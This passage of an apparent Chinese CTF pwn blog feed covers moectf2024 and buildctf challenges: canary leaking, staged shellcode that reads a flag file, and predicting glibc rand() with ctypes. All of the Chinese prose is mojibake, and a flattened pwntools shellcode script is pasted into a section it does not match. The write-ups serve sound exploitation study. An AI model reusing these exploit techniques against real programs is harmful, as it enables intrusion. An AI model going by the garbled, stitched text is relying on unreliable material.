ä½ç¬¦ï¼Œé€šå¸¸ç¬¬ä¸€ä¸ªå‡ å­—èŠ‚å¯èƒ½æ˜¯ä¸è·³è½¬æ— å…³çš„å†…å®¹ã€‚</li><li>ä» <code>0x401056</code> å¼€å§‹ï¼ŒçœŸæ­£çš„æŒ‡ä»¤æ‰ä¼šæ‰§è¡Œ:<ul><li><code>push 2</code>ï¼šå°†å€¼ <code>2</code> å‹å…¥æ ˆã€‚è¿™é€šå¸¸ç”¨äºæ ‡è¯†è¯¥ <code>PLT</code> æ¡ç›®ï¼Œè¡¨ç¤ºå®ƒæ˜¯ <code>system</code> å‡½æ•°çš„ç¬¬ 2 ä¸ªæ¡ç›®ï¼ˆç´¢å¼• <code>2</code>ï¼‰ï¼Œç”¨äºä¼ é€’ç»™é“¾æ¥è§£æå™¨ã€‚</li><li><code>jmp sub_401020</code>ï¼šè¿™æ˜¯è·³è½¬åˆ° <code>PLT</code> çš„è§£æå™¨å‡½æ•°ï¼Œç”¨äºè§£æåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°åœ°å€ã€‚</li></ul></li></ul><h4 id="ä¸ºä»€ä¹ˆæ˜¯-0x401056ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ˜¯-0x401056ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ˜¯ 0x401056ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ˜¯ <code>0x401056</code>ï¼Ÿ</h4><ul><li><strong>åœ°å€å¸ƒå±€</strong>ï¼š<code>0x401050</code> åªæ˜¯ <code>system@plt</code> æ¡ç›®çš„èµ·å§‹åœ°å€ã€‚å®é™…çš„æŒ‡ä»¤ä» <code>0x401056</code> å¼€å§‹ï¼Œå› ä¸º <code>0x401050</code> åˆ° <code>0x401056</code> å¯èƒ½è¢«å¡«å……ä¸ºè·³è½¬è¡¨æˆ–ç”¨äºå…¶ä»–ç›®çš„ï¼ˆå¦‚é¢„ç•™ç©ºé—´ï¼‰ã€‚</li><li><strong>è·³è½¬åˆ°æŒ‡ä»¤çš„è®¾è®¡</strong>ï¼šELF æ–‡ä»¶å’Œ <code>PLT</code> çš„è®¾è®¡é€šå¸¸ä¼šåœ¨æ¯ä¸ªå‡½æ•°æ¡ç›®ä¹‹é—´ç•™æœ‰ä¸€äº›ç©ºé—´ï¼Œä½¿å¾—è·³è½¬å’Œè§£æå¯ä»¥åˆ†é˜¶æ®µè¿›è¡Œã€‚å› æ­¤ï¼Œ<code>0x401056</code> æ˜¯ <code>system@plt</code> ä¸­å®é™…ç”¨äºè·³è½¬å’Œè§£æçš„æŒ‡ä»¤èµ·å§‹ç‚¹ã€‚</li></ul><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><strong><code>0x401050</code></strong> æ˜¯ <code>system@plt</code> çš„å…¥å£åœ°å€ï¼Œä½†å®ƒå¯èƒ½åªæ˜¯ä¸€ä¸ªå ä½ç¬¦æˆ–è·³è½¬è¡¨çš„å¼€å§‹åœ°å€ã€‚</li><li><strong><code>0x401056</code></strong> æ˜¯ <code>system@plt</code> æ¡ç›®ä¸­çš„å®é™…æŒ‡ä»¤èµ·å§‹åœ°å€ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ <code>system</code> å‡½æ•°æ—¶è·³è½¬åˆ°äº†è¿™é‡Œï¼Œå› ä¸ºè¿™é‡ŒåŒ…å«äº†è´Ÿè´£è·³è½¬å’Œè§£æ <code>system</code> å‡½æ•°åœ°å€çš„æŒ‡ä»¤ï¼ˆå¦‚ <code>push 2</code> å’Œ <code>jmp sub_401020</code>ï¼‰ã€‚</li></ul></blockquote><h1 id="Catch-the-canary"><a href="#Catch-the-canary" class="headerlink" title="Catch_the_canary!"></a>Catch_the_canary!</h1><p><mark>arc4randomçœŸéšæœºæ•°çˆ†ç ´<mark> : <a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">è¿™ç¯‡æ–‡ç« </a></mark></mark></p><p><mark>è·³è¿‡scanfçš„è¾“å…¥<mark></mark></mark></p><p><mark>æ³„éœ²canary<mark></mark></mark></p><h2 id="ä¸‹é¢çœ‹å¦‚ä½•è·³è¿‡scanfè¾“å…¥çš„"><a href="#ä¸‹é¢çœ‹å¦‚ä½•è·³è¿‡scanfè¾“å…¥çš„" class="headerlink" title="ä¸‹é¢çœ‹å¦‚ä½•è·³è¿‡scanfè¾“å…¥çš„"></a>ä¸‹é¢çœ‹å¦‚ä½•è·³è¿‡scanfè¾“å…¥çš„</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015195948758.bmp"></p><ul><li>è¦æ±‚è¾“å…¥çš„ä¸å˜ï¼Œæˆ‘ä»¬å¯ä»¥:</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>è¦æ±‚è¾“å…¥æ•°å­—çš„æ—¶å€™ï¼Œè¾“å…¥<span class="string">&#x27;+&#x27;</span> or <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    å¯ä»¥è·³è¿‡è¾“å…¥</span><br></pre></td></tr></table></figure></div><ul><li><mark>æ³„éœ²canary<mark></mark></mark></li></ul><p>åˆ©ç”¨<code>printfã€puts</code>è¾“å‡ºé‡åˆ°\x00ä¼šæˆªæ–­å’Œ<code>canary</code>é¦–å­—èŠ‚æ˜¯\x00æ¥æ³„éœ²canary</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åªéœ€å¡«å……canaryçš„\x00ï¼Œå†åˆ©ç”¨printfå°†canaryè¾“å‡ºå³å¯</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Stop it!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span>+p.recvn(<span class="number">7</span>) <span class="comment"># recvn(m)æŒ‡å®šæ”¶åˆ°må­—èŠ‚</span></span><br></pre></td></tr></table></figure></div><h1 id="shellcode-revenge"><a href="#shellcode-revenge" class="headerlink" title="shellcode_revenge"></a><strong>shellcode_revenge</strong></h1><h2 id="æœ‰é™å­—èŠ‚shellcodeå†æ¬¡è°ƒç”¨read"><a href="#æœ‰é™å­—èŠ‚shellcodeå†æ¬¡è°ƒç”¨read" class="headerlink" title="æœ‰é™å­—èŠ‚shellcodeå†æ¬¡è°ƒç”¨read"></a><mark><strong>æœ‰é™å­—èŠ‚shellcodeå†æ¬¡è°ƒç”¨read</strong><mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0xD</span>uLL);</span><br></pre></td></tr></table></figure></div><ul><li>å¾ˆæ˜æ˜¾0xdå­—èŠ‚å†™å…¥shellcodeé•¿åº¦æ˜¯ä¸å¤Ÿçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†æ¬¡è°ƒç”¨read,å†™å…¥shellcode</li><li>ä¸ºä»€ä¹ˆä¼šæƒ³åˆ°<code>read</code>ï¼Ÿè§‚å¯Ÿæ‰§è¡Œshellcodeå‰çš„å¯„å­˜å™¨ï¼Œ<code>rax=0</code>,åªè¦<code>syscall</code>å°±ä¼šæ‰§è¡Œ<code>read</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015215201688.bmp"></p><p><mark>æ³¨æ„å…¶ä»–å‡ ä¸ªå¯„å­˜å™¨<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015215508725.bmp"></p><ul><li>å› æ­¤åœ¨<code>syscall</code>ä¹‹å‰è¿˜è¦ä¿®æ”¹rsiçš„å€¼ï¼Œå› ä¸ºæˆ‘ä»¬å¾€mmapåœ°å€å†™å…¥äº†è°ƒç”¨readçš„æ±‡ç¼–ä»£ç </li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx , 100</span><br><span class="line">add rsi , 0xd # è¿™æ®µæ±‡ç¼–çš„é•¿åº¦æ˜¯0xd</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div><ul><li>éšåæ­£å¸¸å†™å…¥shellcodeå³å¯</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = 0x20240000</span><br><span class="line">shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(3,addr+0x100,0x100)</span><br><span class="line">shellcode += shellcraft.write(1,addr+0x100,0x100)</span><br></pre></td></tr></table></figure></div><h1 id="Pwn-it-off"><a href="#Pwn-it-off" class="headerlink" title="Pwn_it_off!"></a><strong>Pwn_it_off!</strong></h1><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><mark>å­å‡½æ•°æ ˆç»“æ„çš„åˆ©ç”¨ä»¥åŠgdbè°ƒè¯•<mark></mark></mark></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  beep();</span><br><span class="line">  voice_pwd();</span><br><span class="line">  num_pwd();</span><br><span class="line">  down();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å‘ä¸Šé¢è¿™ç§ç»“æ„ï¼Œä¸€æ—¦è¾“å…¥è¶…è¿‡æ ˆç©ºé—´å°±ä¼šå½±å“åˆ°ä¸‹é¢çš„å‡½æ•°ï¼Œé€šè¿‡gdbåŠ¨è°ƒå¯ä»¥æ˜æ˜¾å‘ç°</li></ul><h1 id="è¿™æ˜¯ä»€ä¹ˆï¼Ÿ32-bitï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼Ÿ32-bitï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼Ÿ32-bitï¼"></a><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ32-bitï¼</strong></h1><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%[^\n]s&quot;</span>, v1);</span><br></pre></td></tr></table></figure></div><ul><li>å…³é”®ç‚¹å°±åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°</li><li><code>getchar()</code>ç”¨sendlineå¡«å……</li><li><code>__isoc99_scanf(&quot;%[^\n]s&quot;, v1);</code>ä»£è¡¨ç€æ— é™é•¿åº¦è¾“å…¥</li></ul><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšæœºæ•°ä¸“é¢˜</title>
      <link href="/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/"/>
      <url>/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯ä¼ªéšæœºï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ä¼ªéšæœºï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¼ªéšæœºï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ä¼ªéšæœºï¼Ÿ</h1><p>å¯¹äºåŸºæœ¬çš„éšæœºæ•°ç”Ÿæˆï¼Œæ¯”å¦‚è¯´</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srand rand</span><br><span class="line">srandom random</span><br><span class="line"><span class="comment"># ä½äºstdlibå¤´æ–‡ä»¶é‡Œé¢</span></span><br></pre></td></tr></table></figure></div><p>è¿™ä¸¤ä¸ªå‡½æ•°çš„éšæœºæ•°ç”Ÿæˆéƒ½åŸºäºæ—¶é—´ç§å­seedï¼Œé€šå¸¸æ¥è¯´ï¼Œåªè¦glibcç›¸åŒï¼Œseedç›¸åŒï¼Œé‚£ä¹ˆæ‰€ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹éšæœºæ•°ç”Ÿäº§çš„ä»£ç "><a href="#ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹éšæœºæ•°ç”Ÿäº§çš„ä»£ç " class="headerlink" title="ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹éšæœºæ•°ç”Ÿäº§çš„ä»£ç "></a>ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹éšæœºæ•°ç”Ÿäº§çš„ä»£ç </h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the first random num is %d\n&quot;</span>,rand()%<span class="number">100</span>);</span><br><span class="line">srand(<span class="number">1</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if the seed is 1 , the random num is %d\n&quot;</span>,rand()%<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the first random num is <span class="number">83</span></span><br><span class="line"><span class="keyword">if</span> the seed is <span class="number">1</span> , the random num is <span class="number">83</span></span><br></pre></td></tr></table></figure></div><ul><li><p><mark>srand(1)ä¸­çš„1ä»£è¡¨éšæœºæ•°çš„ç§å­(seed)<mark></mark></mark></p></li><li><p>ç¬¬ä¸€ä¸ªrandom numå’Œç¬¬äºŒæ¬¡è®¾ç½®éšæœºæ•°ç§å­ä¸º1æ‰€äº§ç”Ÿçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„ï¼Œä»£è¡¨ç€ä¸è®¾ç½®éšæœºæ•°é‚£ä¹ˆé»˜è®¤çš„éšæœºæ•°ç§å­å°±æ˜¯1</p></li></ul><h2 id="ä¼ªéšæœºçš„åˆ©ç”¨"><a href="#ä¼ªéšæœºçš„åˆ©ç”¨" class="headerlink" title="ä¼ªéšæœºçš„åˆ©ç”¨"></a>ä¼ªéšæœºçš„åˆ©ç”¨</h2><ul><li>ä¸‹å›¾æ˜¯åœ¨Ubuntu22.04çš„æƒ…å†µä¸‹è¿è¡ŒåŒæ ·çš„ä»£ç (ä¸Šé¢æ˜¯åœ¨ubuntu24.04è¿è¡Œ)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131824312.bmp"></p><p>å¯ä»¥å‘ç°äº§ç”Ÿçš„éšæœºæ•°æ˜¯ç›¸åŒçš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131837873.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131854890.bmp"></p><p><mark>æˆ‘ä»¬å‘ç°è™½ç„¶æ˜¯åœ¨ä¸åŒçš„ubuntuç‰ˆæœ¬ï¼Œå³glibcç‰ˆæœ¬ä¸åŒçš„ç¯å¢ƒä¸‹è¿è¡Œï¼Œä½†æ˜¯ç¨‹åºæ‰€åˆ©ç”¨çš„libcç‰ˆæœ¬å’Œldç‰ˆæœ¬ç›¸åŒï¼Œç®—æ³•ç›¸åŒï¼Œä»–ä»¬æ‰€äº§ç”Ÿçš„éšæœºæ•°ä¾æ—§æ˜¯ç›¸åŒçš„ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºçš„æ¦‚å¿µ<mark></mark></mark></p><ul><li>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ç›¸åŒçš„libcå°±å¯ä»¥æŒæ¡éšæœºæ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å†™pwnçš„è„šæœ¬æ˜¯æ‹¿pythonå†™çš„ï¼Œåœ¨pythonä¸‹å¦‚ä½•æ¨¡æ‹Ÿcè¯­è¨€äº§ç”Ÿéšæœºæ•°å‘¢ï¼Œ<mark>ctypeåº“<mark></mark></mark></li><li>ä¸‹é¢å±•ç¤ºåŸºæœ¬çš„åˆ©ç”¨(<a href="http://downbeat.top/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/">è¿™ç¯‡æ–‡ç« </a>æåˆ°è¿‡)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="comment"># æœ¬åœ°libc</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>) <span class="comment"># æ—¶é—´ç§å­ï¼Œ0ä»£è¡¨æœ¬åœ°æ—¶é—´</span></span><br><span class="line">libc.srand(seed) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">srand æ­é… rand</span></span><br><span class="line"><span class="string">srandom æ­é… random</span></span><br><span class="line"><span class="string">å‰è€…å®‰å…¨æ€§å·®</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><p>åŸºæœ¬çš„ä»‹ç»å°±åˆ°è¿™é‡Œï¼Œä¸‹é¢çœ‹å‡ ä¸ªä¾‹é¢˜å§ï¼š</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="srand-rand"><a href="#srand-rand" class="headerlink" title="srand&#x2F;rand"></a>srand&#x2F;rand</h2><p><a class="link" href="http://27.25.151.80:8000/games/2/challenges">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>buildctf ä½ æƒ³æˆä¸ºæ²™å¨ç›ä¼ å¥‡å—</p><ul><li>ä¸»å‡½æ•°éƒ¨åˆ†</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  initial(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    fgets(num, <span class="number">4</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(num) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        buy();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        eat();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        check();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        thief();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        beggar();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;go out&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¹ä¸€çœ‹ä»¥ä¸ºæ˜¯å †é¢˜ï¼Œä½†å…¶å®å¾ˆç®€å•ã€‚</p><ul><li>åœ¨eatå‡½æ•°ä¸­å‘ç°ï¼Œåªè¦Shawarmaæ•°é‡å¤§äº99å°±å¯ä»¥è·å¾—shell,è€Œåœ¨beggarå‡½æ•°é‡Œé¢å‘ç°æ»¡è¶³rand() &amp; 1&#x3D;&#x3D;0ï¼Œå°±å¯ä»¥è·å¾—Shawarmaã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">eat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402190);</span><br><span class="line">  result = Shawarma;</span><br><span class="line">  <span class="keyword">if</span> ( Shawarma &gt; <span class="number">99</span> )</span><br><span class="line">    result = system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  Shawarma = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">beggar</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (rand() &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402244);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)--money;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402260);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)++Shawarma;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>xÂ from pwn import *context(arch&#x3D;â€™amd64â€™,log_level&#x3D;â€™debugâ€™)â€‹#p &#x3D; process(â€œ.&#x2F;pwnâ€)p &#x3D; remote(â€œchallenge.basectf.funâ€,30343)â€‹def bug(): Â  Â gdb.attach(p) Â  Â pause()â€‹shellcode &#x3D; (â€˜â€™â€™ Â   mov rax, 0x67616c662f2e  Â   push rax Â   mov rsi, rsp Â   xor rax, rax Â   xor rdi, rdi Â   sub rdi, 100 Â   xor rdx, rdx Â   mov r10, 7 Â   mov rax, 0x101 Â   syscall  Â  Â  Â  Â  Â  Â  Â   Â   mov rdi,1 Â   mov rsi,3 Â   Â   mov rdx,0 Â   mov r10,0x100 Â   push 40 Â   pop rax Â   syscall â€˜â€™â€™)â€‹p.send(asm(shellcode))p.interactive()python</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initial</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> 